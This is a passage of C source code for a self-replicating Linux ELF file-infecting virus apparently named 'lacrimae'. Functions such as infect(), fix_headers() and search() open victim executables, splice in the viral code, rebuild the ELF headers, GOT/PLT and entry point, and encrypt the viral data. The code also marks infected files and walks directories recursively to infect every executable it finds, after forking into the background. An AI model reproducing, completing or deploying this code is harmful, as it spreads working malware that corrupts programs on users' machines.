			if (strstr(buf, libcso)) {
				p = buf;
				while (*p != '>')
					p++;
				p++;
				q = ++p;
				while (*++q != ' ')
					;
				*q = '\0';
				return strdup(p);
			}
		}
		fclose(h);
	}
	return NULL;
}
#endif

/* DO FIXES */
static int fix_headers(uint8_t *file, code_t *centry, char *filename)
{
	Elf32_Rel *rel;
	Elf32_Dyn *dyn;
	uint32_t si, so;
	code_t *c;
	int i, j;
#ifdef	PRELINK_PERFECT
	uint32_t old_time = 0, *checksum = NULL, *prelinked = NULL;
#endif

	/* fix .rel.dyn */
	rel = (Elf32_Rel*)sec[SI_RELDYN]->data;
	for ( ; ((char*)rel - (char*)sec[SI_RELDYN]->data) < sec[SI_RELDYN]->size; rel++) {
		if (ELF32_R_TYPE(rel->r_info) == R_386_RELATIVE) {
			if (section_io_by_addr(&si, &so, rel->r_offset - prelink))
				return 1;
			*(uint32_t*)(sections[si].data + so) = fix_addr(*((uint32_t*)(sections[si].data + so)));
		}
		rel->r_offset = fix_addr(rel->r_offset);
	}
	/* rebuild .got.plt & .rel.plt */
	*((uint32_t*)(sec[SI_GOTPLT]->data + 0)) = sec[SI_DYNAMIC]->addr;
#ifdef	PRELINK_PERFECT
	libc_info lci;
	bzero(&lci, sizeof(libc_info));	
	if (prelink) {
		char *libc_file = find_libc(sec[SI_INTERP]->data, filename);
		if (libc_file != NULL) {
			int h = open(libc_file, 0);
			if (h > 0) {
				lci.l = lseek(h, 0, 2);
				if (lci.l > 0) {
					lci.m = mmap(NULL, lci.l, PF_R, MAP_PRIVATE, h, 0);
					if (lci.m != MAP_FAILED) {
						Elf32_Ehdr *ehdr = (Elf32_Ehdr*)lci.m;
						Elf32_Phdr *phdr = (Elf32_Phdr*)(lci.m + ehdr->e_phoff);
						uint32_t base_address = 0;
						for (dyn = NULL, i = 0; i < ehdr->e_phnum; i++)
							if (phdr[i].p_offset == 0 && phdr[i].p_type == PT_LOAD)
								base_address = phdr[i].p_vaddr;
							else
							if (phdr[i].p_type == PT_DYNAMIC)
								dyn = (Elf32_Dyn*)(lci.m + phdr[i].p_offset);
						if (base_address > 0 && dyn) {
							for (i = 0; dyn[i].d_tag != DT_NULL; i++) {
								uint32_t t = (uint32_t)(lci.m + dyn[i].d_un.d_ptr - base_address);
								if (dyn[i].d_tag == DT_STRTAB)
									lci.dynstr = (char*)t;
								else
								if (dyn[i].d_tag == DT_SYMTAB)
									lci.dynsym = (Elf32_Sym*)t;
								else
								if (dyn[i].d_tag == DT_HASH)
									lci.nsyms = ((uint32_t*)t)[1];
								else
								if (dyn[i].d_tag == DT_VERSYM)
									lci.versym = (uint16_t*)t;
							}
							if (lci.dynstr && lci.nsyms && lci.dynsym && lci.versym)
								lci.valid++;
						}
					}
				}
				close(h);
			}
			free(libc_file);
		}
	}
#endif
	/* for the RTLD to be able to "unprelink" the pointers to PLT if the executable
	needs to be forcedly relocated */
	if (prelink)
		*((uint32_t*)(sec[SI_GOTPLT]->data + 4)) = sec[SI_PLT]->addr + 0x16;
	for (i = 16; i < sec[SI_PLT]->size; i += 16) {
		uint32_t a0, a1;
		a0 = *(uint32_t*)(sec[SI_PLT]->data + i + 2); /* offset in .got.plt */
		a1 = *(uint32_t*)(sec[SI_PLT]->data + i + 7); /* offset in .rel.plt */

		/* we should update GOT entries either if the executable not prelinked,
		since the address of the PLT was changed and we need to reflect it, or
		executable was prelinked, but we added new functions and their GOT entries
		must contain valid libc addresses or the pointers to the PLT if we failed
		to resolve them */
		if (prelink == 0 || *((uint32_t*)(sec[SI_GOTPLT]->data + a0)) == 0) {
			uint32_t a2 = (uint32_t)(sec[SI_PLT]->addr + i + 6);
#ifdef	PRELINK_PERFECT
			if (lci.valid) {
				uint32_t t;
				char *name;
				/* index of symbol */
				t = ELF32_R_SYM(((Elf32_Rel*)(sec[SI_RELPLT]->data + a1))->r_info);
				/* name of symbol */
				name = (char*)(((Elf32_Sym*)(sec[SI_DYNSYM]->data))[t].st_name + (uint32_t)sec[SI_DYNSTR]->data);
				/* index of symbol in the libc */
				for (t = 0, j = 0; j < lci.nsyms; j++) {
					/* the bit 15 in the versym is the hidden flag, mask it off */
					/* fuck with verdef i want the index be equal to two! */
					if (!strcmp(lci.dynsym[j].st_name + lci.dynstr, name) && (lci.versym[j] & 0x7fff) == 2) {
						t = lci.dynsym[j].st_value;
						break;
					}
				}
				if (t)
					a2 = t;
			}
#endif
			*((uint32_t*)(sec[SI_GOTPLT]->data + a0)) = a2;
		}
		((Elf32_Rel*)(sec[SI_RELPLT]->data + a1))->r_offset = sec[SI_GOTPLT]->addr + a0;
	}
#ifdef	PRELINK_PERFECT
	if (prelink && lci.m && lci.m != MAP_FAILED)
		munmap(lci.m, lci.l);
#endif

	/* fix code */
	uint32_t old_gotoff = sec[SI_GOT]->ohdr->sh_addr + sec[SI_GOT]->ohdr->sh_size - prelink;
	uint32_t new_gotoff = sec[SI_GOT]->addr + sec[SI_GOT]->size - prelink;
	for (i = 1; i < shnum; i++) {
		if (sections[i].code == NULL)
			continue;
		FOR_EACH(sections[i].code, c)
			/* the order of first three ifs must be preserved, fields are in union */
			if (c->flags & FL_EXTERN) {
				*((uint32_t*)(file + c->dsta + 1)) = (sec[SI_PLT]->addr + symbol_to_plt(c->symbol) - prelink) - c->dsta - 5;
			} else if (c->flags & FL_GOTOFF) {
				if (c->flags & FL_ME)
					c->diza.addr4 = (sec[SI_DATA]->addr - prelink + sec[SI_DATA]->ohdr->sh_size + (c->dref - virus_data)) - new_gotoff;
				else
					c->diza.addr4 = fix_addr(prelink + old_gotoff + c->diza.addr4) - prelink - new_gotoff;
				yad_asm(file + c->dsta, &c->diza);
			} else if (c->link != NULL) {
#ifdef	OJMP
				uint32_t r = c->link->dsta - c->dsta - c->diza.len;
				if (c->diza.len > 2) {
					*((uint32_t*)(file + c->dsta + c->diza.len - 4)) = r;
#ifdef	DEBUG_JMPS
					int t = c->link->dsta - c->dsta - 2;
					if ((int)r > -129 && (int)r < 128 && *c->src != 0xe8 && t > -129 && t < 128) {
						putchar('O');
						putd(c->dsta);
						putchar(' ');
						putd(r);
						putchar(10);
					}
#endif
				} else {
					*((uint8_t*)(file + c->dsta + 1)) = r;
#ifdef	DEBUG_JMPS
					if ((int)r < -128 || (int)r > 127) {
						putchar('X');
						putd(c->dsta);
						putchar(' ');
						putb(r);
						putchar(10);
					}
#endif
				}
#else
				/* there is no short jumps anymore */
				*((uint32_t*)(file + c->dsta + c->diza.len - 4)) = c->link->dsta - c->dsta - c->diza.len;		
#endif
			} else if (c->flags & (FL_GOTPTR1|FL_GOTPTR2))	
				*((uint32_t*)(file + c->dsta + c->diza.len - 4)) = new_gotoff - c->dsta + (c->flags & FL_GOTPTR1); /* ? 1 : 0); */
			
	}
	/* FIX JUMP TABLES */
	if (jt != NULL)
		for (i = 2; i < jt[0]; i++) {
			if (section_io_by_addr(&si, &so, jt[i]))
				return 1;
			*(uint32_t*)(sections[si].data + so) = fix_addr(prelink + old_gotoff +
				*(uint32_t*)(sections[si].data + so)) - prelink - new_gotoff;
		}
	/* FIX SYMBOL TABLES */
	fix_symtab((Elf32_Sym*)sec[SI_DYNSYM]->data, sec[SI_DYNSYM]->size);
	/* the following step is optional */
	for (j = 1; j < shnum; j++)
		if (sections[j].ohdr->sh_type == SHT_SYMTAB && sections[j].addr == 0)
			fix_symtab((Elf32_Sym*)sections[j].data, sections[j].size);
/* FIX ENTRY POINT */
	((Elf32_Ehdr*)file)->e_entry = centry->dsta + prelink;
/* COPY (AND ENCRYPT) VIRUS DATA */
	uint8_t *p = sec[SI_DATA]->data + sec[SI_DATA]->ohdr->sh_size;
	uint32_t s = ((uint32_t)&data_end-(uint32_t)&virus);
	memcpy(p, &virus, s);
	/* fill the variables in the new copy of data */
	*(uint32_t*)(p + ((char*)&voffs - (char*)&virus)) = ventry->dsta;
	*(uint32_t*)(p + ((char*)&stext - (char*)&virus)) = sec[SI_TEXT]->addr - prelink;
	*(uint32_t*)(p + ((char*)&dynsym - (char*)&virus)) = sec[SI_DYNSYM]->addr - prelink;
	*(uint32_t*)(p + ((char*)&dynstr - (char*)&virus)) = sec[SI_DYNSTR]->addr - prelink;
	*(uint32_t*)(p + ((char*)&relplt - (char*)&virus)) = sec[SI_RELPLT]->addr - prelink;
	*(uint32_t*)(p + ((char*)&etext - (char*)&virus)) = sec[SI_TEXT]->addr  - prelink+ sec[SI_TEXT]->size;
#ifdef	ENCRYPT_DATA
	unsigned long *key = (unsigned long*)p;	
	s += 7;
	s &= ~7;
	for (i = 16; (i + 8) <= s; i+= 8) {
		encipher((unsigned long*)(p + i), key);
		key[0] += key[1];
		key[1] += key[2];
		key[2] += key[3];
		key[3] += key[0];		
	}
#endif
#ifndef	ADVANCED_MARKER
	/* infection mark */
	file[15]++;
#endif
#ifdef	EXTEND_CTOR
	*((uint32_t*)(sec[SI_CTOR]->data + sec[SI_CTOR]->size - 8)) = ventry->dsta + prelink;
	rel = (Elf32_Rel*)(sec[SI_RELDYN]->data + sec[SI_RELDYN]->size - sizeof(Elf32_Rel));
	rel->r_offset = sec[SI_CTOR]->addr + sec[SI_CTOR]->size - 8;
	rel->r_info = ELF32_R_INFO(0, R_386_RELATIVE);
#endif
	/* fix .dynamic */
	dyn = (Elf32_Dyn*)(sec[SI_DYNAMIC]->data);
	while (dyn->d_tag != DT_NULL) {
		if (dyn->d_tag == DT_INIT)
			dyn->d_un.d_ptr = sec[SI_INIT]->addr;
		if (dyn->d_tag == DT_FINI)
			dyn->d_un.d_ptr = sec[SI_FINI]->addr;
		if (dyn->d_tag == DT_HASH)
			dyn->d_un.d_ptr = sec[SI_HASH]->addr;
		if (dyn->d_tag == DT_STRTAB)
			dyn->d_un.d_ptr = sec[SI_DYNSTR]->addr;
		if (dyn->d_tag == DT_SYMTAB)
			dyn->d_un.d_ptr = sec[SI_DYNSYM]->addr;
		if (dyn->d_tag == DT_PLTGOT)
			dyn->d_un.d_ptr = sec[SI_GOTPLT]->addr;
		if (dyn->d_tag == DT_JMPREL)
			dyn->d_un.d_ptr = sec[SI_RELPLT]->addr;
		if (dyn->d_tag == DT_REL)
			dyn->d_un.d_ptr = sec[SI_RELDYN]->addr;
		if (dyn->d_tag == DT_STRSZ)
			dyn->d_un.d_val = sec[SI_DYNSTR]->size;
		if (dyn->d_tag == DT_RELSZ)
			dyn->d_un.d_val = sec[SI_RELDYN]->size;
		if (dyn->d_tag == DT_PLTRELSZ)
			dyn->d_un.d_ptr = sec[SI_RELPLT]->size;
		if (dyn->d_tag == DT_VERSYM)
			dyn->d_un.d_ptr = sec[SI_GNUVERSION]->addr;
		if (dyn->d_tag == DT_VERNEED)
			dyn->d_un.d_ptr = sec[SI_GNUVERSIONR]->addr;
#ifdef	PRELINK_PERFECT
		if (dyn->d_tag == DT_CHECKSUM) {
			dyn->d_un.d_val = 0;
			checksum = &dyn->d_un.d_val;
		}
		if (dyn->d_tag == DT_GNU_PRELINKED) {
			old_time = dyn->d_un.d_val;
			dyn->d_un.d_val = 0;
			prelinked = &dyn->d_un.d_val;
		}
#endif
		/* FIXME: check other tags */
		dyn++;
	}
	
	Elf32_Ehdr *ehdr = (Elf32_Ehdr*)file;
	Elf32_Phdr *phdr = (Elf32_Phdr*)(file + ehdr->e_phoff);
#ifdef	PRELINK_PERFECT
	Elf32_Shdr *shdr = (Elf32_Shdr*)(file + ehdr->e_shoff);
	/* fix prelink checksum */
	if (checksum != NULL) {
		uint32_t crc = 0;
		for (i = 1; i < shnum; i++)
			if ( (shdr[i].sh_flags & (SHF_ALLOC | SHF_WRITE | SHF_EXECINSTR)) && shdr[i].sh_size && (shdr[i].sh_type != SHT_NOBITS))
				crc = crc32(crc, file + shdr[i].sh_offset, shdr[i].sh_size);
		*checksum = crc;
	}
	/* restore prelinked time */
	if (prelinked != NULL)
		*prelinked = old_time;
#endif
	/* fix prelink' undo */
	if (sec[SI_PRELINKUNDO]) {
		Elf32_Ehdr *undo_ehdr = (Elf32_Ehdr*)sec[SI_PRELINKUNDO]->data;
		Elf32_Phdr *undo_phdr = (Elf32_Phdr*)((char*)undo_ehdr + sizeof(Elf32_Ehdr));
		Elf32_Shdr *undo_shdr = (Elf32_Shdr*)((char*)undo_phdr + sizeof(Elf32_Phdr)*ehdr->e_phnum);
		int undo_shnum = undo_ehdr->e_shnum;
		int undo_shstrndx = undo_ehdr->e_shstrndx;
		uint32_t adjust = sections[shnum - 1].offset - sections[undo_shnum - 1].offset;
		/* copy new EHDR and PHT to prelink undo section */
		memcpy(undo_ehdr, file, (char*)undo_shdr - (char*)undo_ehdr);
		/* fix values */
		undo_ehdr->e_shnum = undo_shnum;
		undo_ehdr->e_entry -= prelink;
		undo_ehdr->e_shstrndx = undo_shstrndx;
		for (i = 0; i < ehdr->e_phnum; i++) {
			undo_phdr[i].p_filesz = phdr[i].p_filesz;
			undo_phdr[i].p_memsz = phdr[i].p_memsz;
			if (undo_phdr[i].p_vaddr) {
				undo_phdr[i].p_vaddr = phdr[i].p_vaddr - prelink;
				undo_phdr[i].p_paddr = phdr[i].p_paddr - prelink;
				undo_phdr[i].p_offset = phdr[i].p_offset;
			}
		}
		for (i = 0; i < undo_shnum - 2; i++) {
			undo_shdr[i].sh_offset = sections[i + 1].offset;
			undo_shdr[i].sh_addr = sections[i + 1].addr;
			if (undo_shdr[i].sh_addr)
				undo_shdr[i].sh_addr -= prelink;
			undo_shdr[i].sh_size = sections[i + 1].size;
		}
		undo_shdr[undo_shnum - 2].sh_offset = sections[shnum - 1].offset - adjust;
		if (undo_ehdr->e_shoff >= sections[undo_shnum - 1].offset)
			undo_ehdr->e_shoff -= adjust;
	}

	return 0;
}

static int infect(char *filename)
{
	int h, l, i;
	unsigned char *m;	
	Elf32_Ehdr *ehdr;
	Elf32_Phdr *phdr;
	uint32_t elf_size;
	code_t *centry;
	uint8_t	*file;
	tsection *_sec[SI_SIZE];

	bzero(_sec, SI_SIZE * 4);	
	m = NULL;
	sections = NULL;
	l = 0;
	sec = _sec;
	file = NULL;
	centry = NULL;
	st = NULL;
	jt = NULL;
	prelink = 0;
	
/* CHECK VICTIM */
	/* open and mmap victim */
	if ((h = open(filename, 2)) < 0)
		goto error;
	l = lseek(h, 0, 2);
	if (l < MIN_SIZE || l > MAX_SIZE)
		goto error;
#ifdef	ADVANCED_MARKER
	if (is_prime(l, primes))
		goto error;
#endif
	m = mmap(NULL, l, PF_R, MAP_PRIVATE, h, 0);
	/* fill pointers to headers */
	ehdr = (Elf32_Ehdr*)m;
	phdr = (Elf32_Phdr*)(m + ehdr->e_phoff);
	if (check_elf_header(ehdr, phdr))
		goto error;
	if (load_elf(ehdr))
		goto error;
		
/* DISASSEMBLE THE VICTIM */
	if ((centry = disassemble_victim(ehdr)) == NULL)
		goto error;

/* SELF-DISASSEMBLY */
	if (virus == NULL) {
		code_t *c = disassemble_itself();
		if (c == BADPTR)
			exit(2);
		virus = c;
	}
	if (add_virus_imports())
		goto error;
/* INSERT OUR CODE */
	if (insert_code())
		goto error;
/* REBUILD ELF FILE */
	if ((file = build_elf(ehdr, phdr, l, &elf_size)) == NULL)
		goto error;
/* DO FIXES */
	if (fix_headers(file, centry, filename))
		goto error;
/* WRITE file */
	munmap(m, l);
	m = NULL;
	if (lseek(h, 0, 0) != 0)
		goto error;
	write(h, file, elf_size);
#ifdef	ADVANCED_MARKER
	ftruncate(h, find_nearest_prime(elf_size, primes, MAX_SIZE));
#endif
	i = 1;
done:	if (m != NULL)
		munmap(m, l);
	if (h > 0)
		close(h);
	/* free memory */
	if (sections != NULL) {
		if (jt != NULL)
			free(jt);
		for (i = 1; i < shnum; i++) {
			if (sections[i].code != NULL)
				freec(sections[i].code, FL_ME);
			if (sections[i].fast)
				free(sections[i].fast);
			/* we can came here from load_elf with malloc'ed section's data or after build_elf, where data were freed... */
			if (sections[i].data != NULL &&	(file == NULL || (sections[i].data < file || sections[i].data > (file + elf_size))))
				free(sections[i].data);
		}
		free(sections);
		if (st != NULL)
			free_tree(st);
	}
	if (file != NULL)
		free(file);
	return i;

error:	i = 0;
	goto done;
}

#define TRUE	1
/* recursively search for executables (c) Andrew Tanenbaum "Modern operating systems", sec. ed., p.621 */
static void search(char *dir_name)
{
	DIR *dirp;						/* pointer to an open directory stream */
	struct stat sbuf;					/* for lstat call to see if file is sym link */
	struct dirent *dp;					/* pointer to a directory entry */

	dirp = opendir(dir_name);				/* open this directory */
	if (dirp == NULL)
		return;						/* dir could not be opened; forget it */
	while (TRUE) {
		dp = readdir(dirp);				/* read next directory entry */
		if (dp == NULL) {				/* NULL means we are done */
//			chdir(ddot);				/* go back to parent directory */
			break;					/* exit loop */
		}
		if (dp->d_name[0] == '.')			
			if (*(dp->d_name + 1) == '\0' || *(uint16_t*)(dp->d_name + 1) == 0x2e)
				continue;			/* skip the . and .. directories */
		lstat(dp->d_name, &sbuf);			/* is entry a symbolic link? */
		if (S_ISLNK(sbuf.st_mode))
			continue;				/* skip symbolic links */
		if (chdir(dp->d_name) == 0) {			/* if chdir succeeds, it must be a dir */
			search(ddot + 1);			/* yes, enter and search it */
			chdir(ddot);
		} else {					/* no (file), infect it */
			if (access(dp->d_name, X_OK) == 0)	/* if executable, infect it */
				infect(dp->d_name);
		}
	}
	closedir(dirp);						/* dir processed; close and return */
}

static void lacrimae(void)
{
#ifdef	DEBUG_ALLOC
	mtrace();
#endif
#ifndef	DEBUG
	
	/* the parent (victim) is /not/ interested in the virus exit status */
	signal(SIGCHLD, SIG_IGN); 
	if (fork() != 0)		
		return;
	setsid();
	setpriority(PRIO_PROCESS, 0, 20);
#endif
#ifdef	ENCRYPT_DATA
	int i;
	uint8_t *p = (uint8_t*)&virus;
	unsigned long *key = (unsigned long*)p;
	uint32_t s = ((uint32_t)&data_end-(uint32_t)&virus + 7) & ~7;
	for (i = s; i >= 16; i -= 8) {
		decipher((unsigned long*)(p + i), key);
		key[3] -= key[0];
		key[2] -= key[3];
		key[1] -= key[2];
		key[0] -= key[1];
	}
#endif
#ifdef	ADVANCED_MARKER
	if ((primes = make_primes(MAX_SIZE)) == NULL)
		goto error;
#endif
	virus = NULL;
	search(ddot + 1);
	if (virus) {
		freec(virus, 0);
		free(fastvirus);
	}
#ifdef	ADVANCED_MARKER
	free(primes);
error:
#endif
#ifndef	DEBUG
	exit(0);
#else
	puts(ok);
#endif
}

/* fake host */
int main(int argc, char **argv)
{
	lacrimae();
	return 0;
}
